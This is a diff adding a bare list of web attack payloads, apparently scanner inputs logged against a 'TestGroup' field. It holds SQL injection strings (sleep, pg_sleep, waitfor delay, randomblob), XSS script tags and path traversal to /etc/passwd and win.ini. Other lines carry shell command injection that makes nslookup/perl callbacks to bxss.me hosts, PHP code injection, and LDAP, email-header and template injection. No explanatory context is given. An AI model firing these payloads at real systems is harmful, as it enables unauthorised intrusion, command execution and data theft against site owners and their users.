@@ -1,0 +1,240 @@
+'\x00'
+'\nA:B'
+'-1 OR 2+398-398-1=0+0+0+1'
+'-1 OR 2+477-477-1=0+0+0+1'
+'-1 OR 3+398-398-1=0+0+0+1'
+'-1 OR 3+477-477-1=0+0+0+1'
+','
+',`@^*$;#'
+';'
+";assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));"
+'!(()&&!|*|*|'
+'../../../../../../../../../../../../../../etc/passwd'
+'../../../../../../../../../../../../../../windows/win.ini'
+'../TestGroup'
+'./TestGroup'
+"'"
+"';print(md5(31337));$a='"
+"'.gethostbyname(lc('hitmm'.'couzmfco00df6.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(108).chr(88).chr(112).chr(82).'"
+"'.gethostbyname(lc('hittp'.'hgirgjce74d91.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(116).chr(65).chr(106).chr(88).'"
+"'.print(md5(31337)).'"
+'\'"'
+'\'"()'
+'\'"()&%<zzz><ScRiPt >7SuT(9799)</ScRiPt>'
+'\'"()&%<zzz><ScRiPt >h2YQ(9864)</ScRiPt>'
+"'+response.write(9427990*9200599)+'"
+"'+response.write(9960429*9559545)+'"
+'";print(md5(31337));$a="'
+'".gethostbyname(lc("hitmh"."mjxgglkjd7a16.bxss.me."))."A".chr(67).chr(hex("58")).chr(113).chr(71).chr(100).chr(65)."'
+'".gethostbyname(lc("hityo"."cfntsotg50cb9.bxss.me."))."A".chr(67).chr(hex("58")).chr(115).chr(79).chr(112).chr(85)."'
+'"+response.write(9427990*9200599)+"'
+'"+response.write(9960429*9559545)+"'
+'())[]]{}}'
+'(nslookup hitbmxboinwuz1c920.bxss.me||perl -e "gethostbyname(\'hitbmxboinwuz1c920.bxss.me\')")'
+'(nslookup hithvhpqazvoea685e.bxss.me||perl -e "gethostbyname(\'hithvhpqazvoea685e.bxss.me\')")'
+'(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'"+(select(0)from(select(sleep(15)))v)+"*/'
+')'
+')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))'
+"[']"
+"{'}"
+'{% TestGroup'
+'{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}'
+"@'"
+'@@2SovN'
+'@@wWn3b'
+"*'"
+'*)                          (uid=*'
+'/'
+'/,%ENV,/'
+'/../../../../../../../../bin/id\x00|'
+'/..\\\\../..\\\\../..\\\\../..\\\\../..\\\\../..\\\\../boot.ini'
+'/..\\\\../..\\\\../..\\\\../..\\\\../..\\\\../..\\\\../windows/win.ini'
+'/./..././..././..././..././..././..././..././..././..././..././..././...\\\\boot.ini'
+'/./..././..././..././..././..././..././..././..././..././..././..././...\\\\windows\\win.ini'
+"/'"
+'/*'
+'\x00/etc/passwd\x00'
+'/etc/shells'
+'/xfs.bxss.me'
+'\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\/boot.ini'
+'\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\/windows/win.ini'
+'\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\boot.ini'
+'\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\boot.ini%00'
+'\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\windows\\win.ini'
+'\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\..\\..\\\\windows\\win.ini%00'
+"\\'"
+'\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\.../boot.ini'
+'\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...\\\\.\\\\...windows//win.ini'
+'&echo ckyxoc$()\\ sgciaw\\nz^xyu||a #\' &echo ckyxoc$()\\ sgciaw\\nz^xyu||a #|" &echo ckyxoc$()\\ sgciaw\\nz^xyu||a #'
+'&echo crqopa$()\\ xnuovi\\nz^xyu||a #\' &echo crqopa$()\\ xnuovi\\nz^xyu||a #|" &echo crqopa$()\\ xnuovi\\nz^xyu||a #'
+"#'"
+'#if(TestGroup =='
+'%00'
+'%0a'
+'%n%s%n%s%n%s%n%s%n%s'
+'`'
+'`(nslookup hitnficqskjpo4cfea.bxss.me||perl -e "gethostbyname(\'hitnficqskjpo4cfea.bxss.me\')")`'
+'`(nslookup hitpbtcyixgrl9e8e4.bxss.me||perl -e "gethostbyname(\'hitpbtcyixgrl9e8e4.bxss.me\')")`'
+"^'"
+'^(#$!@#$)(()))******'
+'<!--'
+'<#if TestGroup'
+'|(nslookup hitfxzsbwepibff29c.bxss.me||perl -e "gethostbyname(\'hitfxzsbwepibff29c.bxss.me\')")'
+'|(nslookup hitvzruaxcmkc9b7c8.bxss.me||perl -e "gethostbyname(\'hitvzruaxcmkc9b7c8.bxss.me\')")'
+'|echo buhfkn$()\\ bynfgl\\nz^xyu||a #\' |echo buhfkn$()\\ bynfgl\\nz^xyu||a #|" |echo buhfkn$()\\ bynfgl\\nz^xyu||a #'
+'|echo gubsty$()\\ mvcliu\\nz^xyu||a #\' |echo gubsty$()\\ mvcliu\\nz^xyu||a #|" |echo gubsty$()\\ mvcliu\\nz^xyu||a #'
+'$(nslookup hitdepvdbrwhrd7266.bxss.me||perl -e "gethostbyname(\'hitdepvdbrwhrd7266.bxss.me\')")'
+'$(nslookup hitnwyzabfcpgcd4c3.bxss.me||perl -e "gethostbyname(\'hitnwyzabfcpgcd4c3.bxss.me\')")'
+'${"PRbgxaxaxigjjbcijajaedcjcjeRP"}'
+'${@print(md5(31337))}'
+'${@print(md5(31337))}\\'
+'${9999275+10000445}'
+'${9999560+9999265}'
+"0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"
+'0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z'
+'1'
+"1 waitfor delay '0:0:15' -- "
+'1\'"'
+'15.124.2.120/serverinclude.html?TestGroup'
+'1HcQNsggO'
+'1mlqiol8O'
+'1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%00.jpg'
+'31UPvT05'
+"4cZAqIeV'; waitfor delay '0:0:15' -- "
+"6ei2FS8o')) OR 989=(SELECT 989 FROM PG_SLEEP(15))--"
+"9ploFZ6f')) OR 827=(SELECT 827 FROM PG_SLEEP(15))--"
+"9VZj0I8F') OR 766=(SELECT 766 FROM PG_SLEEP(15))--"
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+'Accounting'
+'Administrator'
+'bxss.me'
+'bxss.me/t/xss.html?%00'
+'c:/boot.ini'
+'c:/boot.ini%00'
+'c:/windows/win.ini'
+'c:\\boot.ini'
+'c:\\windows\\win.ini'
+'c:\\windows\\win.ini%00'
+'DefaultGroup'
+'echo lhggdb$()\\ rkonbl\\nz^xyu||a #\' &echo lhggdb$()\\ rkonbl\\nz^xyu||a #|" &echo lhggdb$()\\ rkonbl\\nz^xyu||a #'
+'echo zojhle$()\\ akyuck\\nz^xyu||a #\' &echo zojhle$()\\ akyuck\\nz^xyu||a #|" &echo zojhle$()\\ akyuck\\nz^xyu||a #'
+'file:///etc/passwd'
+'file:/c:/boot.ini'
+'file:/c:/boot.ini%00'
+'file:/c:/windows/win.ini'
+'file:/c:/windows/win.ini%00'
+'file:\\c:\\boot.ini'
+'file:\\c:\\windows\\win.ini'
+'http://15.124.2.120/serverinclude.html?TestGroup'
+'Http://bxss.me/t/fit.txt'
+'http://bxss.me/t/fit.txt%3F.jpg'
+'HttP://bxss.me/t/xss.html?%00'
+'http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs%3F.jpg'
+'http://does.not.exist.spidynamics.com/?TestGroup'
+'if(now()=sysdate(),sleep(15),0)'
+"JPGMapXX' OR 741=(SELECT 741 FROM PG_SLEEP(15))--"
+'Management'
+'OnIGP5zG'
+'QWPKOVcV'
+'response.write(9427990*9200599)'
+'response.write(9960429*9559545)'
+'Sales'
+'set\x00'
+'set\nset'
+"set'|set&set'"
+'set"|set&set"'
+'set&set|'
+'set`set`'
+'set|set&set'
+'SkpRRG5yRzBS'
+'tchAcgP8'
+'TestGroup'
+'TestGroup and 1 < (select case when 1=0 then upper(hex(randomblob(300000000))) else 0 end)'
+'TestGroup and 1 < (select case when 1=1 then upper(hex(randomblob(300000000))) else 0 end)'
+'TestGroup and 1 = if(5=0, sleep(2), 0)'
+'TestGroup and 1 = if(5=5, sleep(2), 0)'
+'TestGroup and 1 in (case when 1=0 then (sysmaster:yieldn(2)) else 2 end)'
+'TestGroup and 1 in (case when 1=1 then (sysmaster:yieldn(2)) else 2 end)'
+"TestGroup and 1=(case 'a' when 'a' then pg_sleep(2) else '0' end)"
+"TestGroup and 1=(case 'b' when 'b' then pg_sleep(2) else '0' end)"
+'TestGroup and 1=if(5=0, benchmark(1500000, md5(1)), 0)'
+'TestGroup and 1=if(5=5, benchmark(1500000, md5(1)), 0)'
+"TestGroup' and (1 < (select case when 1=0 then upper(hex(randomblob(300000000))) else 0 end)) and '1'='1"
+"TestGroup' and (1 < (select case when 1=1 then upper(hex(randomblob(300000000))) else 0 end)) and '1'='1"
+"TestGroup' AND (select count(*) from INFORMATION_SCHEMA.SYSTEM_TABLES)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from Information_schema.tables)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from java.lang.Object o)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from M_DATABASE)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from pg_tables)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from sqlite_master) > 0 OR '4'='0"
+"TestGroup' AND (select count(*) from sys.objects)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from syscat.tables)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from systables)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from SYSTEM_TABLES)> 0 OR '4'='0"
+"TestGroup' AND (select count(*) from tab)> 0 OR '4'='0"
+"TestGroup' and 1 = if(5=0, sleep(2), 0) and '1'='1"
+"TestGroup' and 1 = if(5=5, sleep(2), 0) and '1'='1"
+"TestGroup' and 1 in (case when 1=0 then (sysmaster:yieldn(2)) else 2 end) and '1'='1"
+"TestGroup' and 1 in (case when 1=1 then (sysmaster:yieldn(2)) else 2 end) and '1'='1"
+"TestGroup' and 1=(case 'a' when 'a' then pg_sleep(2) else '0' end) and '1'='1"
+"TestGroup' and 1=(case 'b' when 'a' then pg_sleep(2) else '0' end) and '1'='1"
+"TestGroup' and 1=if(5=0, benchmark(1500000, md5(1)), 0) and '1'='1"
+"TestGroup' and 1=if(5=5, benchmark(1500000, md5(1)), 0) and '1'='1"
+"TestGroup' AND 2*3*8=6*8 AND '919X'='919X"
+"TestGroup' AND 2*3*8=6*8 AND 'GXRn'='GXRn"
+"TestGroup' AND 5=0 OR 's'='0"
+"TestGroup' AND 5=5 OR 's'='0"
+"TestGroup' OR"
+"TestGroup' or ''='"
+'TestGroup\'"()&%<zzz><ScRiPt >7SuT(9651)</ScRiPt>'
+'TestGroup\'"()&%<zzz><ScRiPt >h2YQ(9422)</ScRiPt>'
+"TestGroup'&&sleep(27*1000)*npndmu&&'"
+"TestGroup'&&sleep(27*1000)*ugmwuc&&'"
+"TestGroup'||'"
+"TestGroup'||''||'"
+"TestGroup'|||'"
+"TestGroup'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'"
+"TestGroup'||sleep(27*1000)*jvxdek||'"
+"TestGroup'||sleep(27*1000)*tyewku||'"
+'TestGroup" AND 2*3*8=6*8 AND "5LSP"="5LSP'
+'TestGroup" AND 2*3*8=6*8 AND "SKWp"="SKWp'
+'TestGroup"&&sleep(27*1000)*gaeqhd&&"'
+'TestGroup"&&sleep(27*1000)*yznamb&&"'
+'TestGroup"||sleep(27*1000)*trmhlu||"'
+'TestGroup"||sleep(27*1000)*zcbgnf||"'
+'TestGroup&n918756=v924278'
+'TestGroup&n985891=v976190'
+"TestGroup%' AND 2*3*8=6*8 AND 'THMi'!='THMi%"
+"TestGroup%' AND 2*3*8=6*8 AND 'uv7i'!='uv7i%"
+'TestGroup%0abcc:009247.7-1863.7.8444a.19201.2@bxss.me'
+'TestGroup%0abcc:009247.8-1493.8.d7d4c.19201.2@bxss.me'
+'TestGroup<esi:include src="http://bxss.me/rpb.png"/>'
+'TestGroup9 or 1 < (select case when 1=0 then upper(hex(randomblob(300000000))) else 0 end)'
+'TestGroup9 or 1 < (select case when 1=1 then upper(hex(randomblob(300000000))) else 0 end)'
+'TestGroup9 or 1 = if(5=0, sleep(2), 0)'
+'TestGroup9 or 1 = if(5=5, sleep(2), 0)'
+'TestGroup9 or 1 in (case when 1=0 then (sysmaster:yieldn(2)) else 2 end)'
+'TestGroup9 or 1 in (case when 1=1 then (sysmaster:yieldn(2)) else 2 end)'
+"TestGroup9 or 1=(case 'a' when 'a' then pg_sleep(2) else '0' end)"
+"TestGroup9 or 1=(case 'b' when 'b' then pg_sleep(2) else '0' end)"
+'TestGroup9 or 1=if(5=0, benchmark(1500000, md5(1)), 0)'
+'TestGroup9 or 1=if(5=5, benchmark(1500000, md5(1)), 0)'
+"TestGroup9' or (1 < (select case when 1=0 then upper(hex(randomblob(300000000))) else 0 end)) OR '1'='2"
+"TestGroup9' or (1 < (select case when 1=1 then upper(hex(randomblob(300000000))) else 0 end)) OR '1'='2"
+"TestGroup9' or 1 = if(5=0, sleep(2), 0) OR '1'='2"
+"TestGroup9' or 1 = if(5=5, sleep(2), 0) OR '1'='2"
+"TestGroup9' or 1 in (case when 1=0 then (sysmaster:yieldn(2)) else 2 end) OR '1'='2"
+"TestGroup9' or 1 in (case when 1=1 then (sysmaster:yieldn(2)) else 2 end) OR '1'='2"
+"TestGroup9' or 1=(case 'a' when 'a' then pg_sleep(2) else '0' end) OR '1'='2"
+"TestGroup9' or 1=(case 'b' when 'a' then pg_sleep(2) else '0' end) OR '1'='2"
+"TestGroup9' or 1=if(5=0, benchmark(1500000, md5(1)), 0) OR '1'='2"
+"TestGroup9' or 1=if(5=5, benchmark(1500000, md5(1)), 0) OR '1'='2"
+'TestGroup9012256'
+'TestGroup9266698'
+'to@example.com>%0d%0abcc:009247.7-1864.7.8444a.19201.2@bxss.me'
+'to@example.com>%0d%0abcc:009247.8-1494.8.d7d4c.19201.2@bxss.me'
+"UFBHU8LN' OR 786=(SELECT 786 FROM PG_SLEEP(15))--"
+'void1939774314)(uid=1939774314void'
+"vtB76Rty'; waitfor delay '0:0:15' -- "
+"wkaLRB5X') OR 600=(SELECT 600 FROM PG_SLEEP(15))--"
+'Y0Z2bkJwYmhv'
